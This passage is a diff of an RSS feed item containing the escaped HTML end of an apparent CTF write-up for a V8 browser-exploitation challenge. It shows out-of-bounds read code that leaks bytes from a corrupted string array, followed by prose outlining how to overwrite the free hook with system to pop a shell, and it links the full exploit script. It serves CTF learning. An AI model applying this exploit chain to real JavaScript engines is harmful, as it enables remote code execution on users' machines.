+        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;up_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;lo_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to the pointer compression, the step for leaking the binary base is much easier now. We can leak some pointer of d8. Then, using the CXA handler to resolve the GI abort and overwrite the free hook with system and call &lt;code&gt;console.log(&#39;sh&#39;)&lt;/code&gt; to get the shell. I exploit with &lt;a href=&#34;https://github.com/wwkenwong/CTF-Writeup/blob/master/browser/CONFidence_CTF_2020_Teaser_Chromatic_aberration/pwn_with_logs.js&#34;&gt;pwn_with_logs.js&lt;/a&gt; will crash due to weird GC issues.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/&#34;&gt;A Eulogy for Patch-gapping Chrome&lt;/a&gt; &lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI&#34;&gt;Compressed pointers in V8&lt;/a&gt; &lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
     </item>
     
   </channel>
